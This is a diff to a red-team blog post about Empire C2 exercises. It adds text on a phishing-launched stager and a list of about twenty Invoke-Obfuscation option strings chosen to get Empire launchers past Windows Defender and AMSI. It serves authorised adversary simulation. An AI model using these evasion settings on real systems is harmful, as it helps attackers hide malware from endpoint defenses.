@@ -32,15 +32,54 @@ Lets speak a bit about how our phishing mail from the 2nd scenario will look, ho
 <li>Phase 7,8,9,10: The stager 0 is the launcher, the part that I had to obfuscate it. If it is successfully run, it will reach the Empire server, the C2 server will respond with the "stage 1" that does all of my key negotiation and finally it loads the Empire agent that enables all of my command and control functionalities. If you prefer, you can take a look at the scheme of how Empire agents are working <a href="https://testmactest.github.io/RedTeam_Exercises_with_OpenSource_Tools_Part_1#howdoimakeuseofopensource" style="text-decoration: none;">here</a></li>
 </ul>
 
-All of the mentioned phases are finding in the below scheme. [The first scenario will use the same steps from "dropper" phase]?????. 
+All of the mentioned phases are finding in the below scheme. 
 <div>
 <center><img src="/images/2020-04-16-RedTeam-Exercises-with-OpenSource-Tools-Part-2.md/arhitecturef.png">
  </center>
 </div>
 
+If you are wondering where is the scheme for the first scenario, I am answering you that it is using the same code as the second scenario, starting from 5th phase. This first scenario is a pre-requisite for having an operationable phishing email.
+
 In order to bypass Windows Defender and AMSI rules, I divided my testing work in half: one for testing the stager's evasion capabilities for not being detected and the second part for testing and developing anti-sandbox features and a way to bypass the Office's sandbox mode. 
 
 ## Scenario 1{#scenario1}
+I will not show all the tests that I did in order to observe and analyze Windwos Defender and AMSI rules. In my examples, I am using multi/launcher stager.<br/>
+In the first scenario I consider I already obtained somehow access in the network via a service exploit, web application vulnerability or through a phishing email.<br/>
+
+As I said in the first part, if you are using Empire as default, it will be catched by Windows Defender. It can not pass the system protections so obfuscation or changes are needed.
+Even if Empire framework is coming with a lot of obfuscation methods or evasion capabilities, Microsoft created a set of signatures based on Empire's stagers behavior, strings, stager's code, and so on. 
+
+In my tests, I observed that the following patterns are flagged:
+<b>1. SafeChecks:</b>
+The stager is coming with SafeChecks enabled by default.
+
+
+Finally, any of the \all options in Invoke-Obfuscation is likely to get caught try using a custom combination of the sub options.
+
+
+
+
+set ObfuscateCommand Token\String\1,1,2,1, Encoding\2, Compress\1
+set ObfuscateCommand Token\String\1,1,2,1, Token\Variable\1, Encoding\2, Compress\1
+set ObfuscateCommand Token\String\1,1,2,1, Token\Variable\1, Encoding\2, Compress\1, Token\Whitespace\1,1,1
+set ObfuscateCommand Token\String\1,1,2,1, Token\Variable\1, Encoding\2, Compress\1, Token\Whitespace\1,1,1, Token\Variable\1
+set ObfuscateCommand Token\String\1,1,2,1, Encoding\2, Compress\1
+set ObfuscateCommand AST\SCRIPTBLOCKAST\1, Encoding\1, Compress\1
+set ObfuscateCommand AST\SCRIPTBLOCKAST\1, Encoding\1
+set ObfuscateCommand AST\SCRIPTBLOCKAST\1, Encoding\1, LAUNCHER\WMIC\0
+set ObfuscateCommand AST\SCRIPTBLOCKAST\1, Encoding\1, Compress\1, LAUNCHER\WMIC\0
+set ObfuscateCommand Token\String\1,1,2,1, Encoding\2, Compress\1, LAUNCHER\WMIC\0
+set ObfuscateCommand Token\String\1,1,2,1, Token\Variable\1, Encoding\2, Compress\1, Token\Whitespace\1,1,1, Token\Variable\1, LAUNCHER\WMIC\0
+set ObfuscateCommand Token\String\1,1,2,1, Token\Variable\1, Encoding\2, Compress\1, Token\Whitespace\1,1,1, LAUNCHER\WMIC\0
+set ObfuscateCommand Token\String\1,1,2,1, Token\Variable\1, Encoding\2, Compress\1, LAUNCHER\WMIC\0
+set ObfuscateCommand Token\String\1,1,2,1, Encoding\2, Compress\1, LAUNCHER\WMIC\0
+set ObfuscateCommand AST\SCRIPTBLOCKAST\1, Encoding\1, LAUNCHER\RUNDLL\0
+set ObfuscateCommand AST\SCRIPTBLOCKAST\1, Encoding\1, Compress\1, LAUNCHER\RUNDLL\0
+set ObfuscateCommand Token\String\1,1,2,1, Encoding\2, Compress\1, LAUNCHER\RUNDLL\0
+set ObfuscateCommand Token\String\1,1,2,1, Token\Variable\1, Encoding\2, Compress\1, Token\Whitespace\1,1,1, Token\Variable\1, LAUNCHER\RUNDLL\0
+set ObfuscateCommand Token\String\1,1,2,1, Token\Variable\1, Encoding\2, Compress\1, Token\Whitespace\1,1,1, LAUNCHER\RUNDLL\0
+set ObfuscateCommand Token\String\1,1,2,1, Token\Variable\1, Encoding\2, Compress\1, LAUNCHER\RUNDLL\0
+set ObfuscateCommand Token\String\1,1,2,1, Encoding\2, Compress\1, LAUNCHER\RUNDLL\0
 
 References:<br/>
 https://support.office.com/en-us/article/Turn-sandbox-mode-on-or-off-to-disable-macros-8CC7BAD8-38C2-4A7A-A604-43E9A7BBC4FB
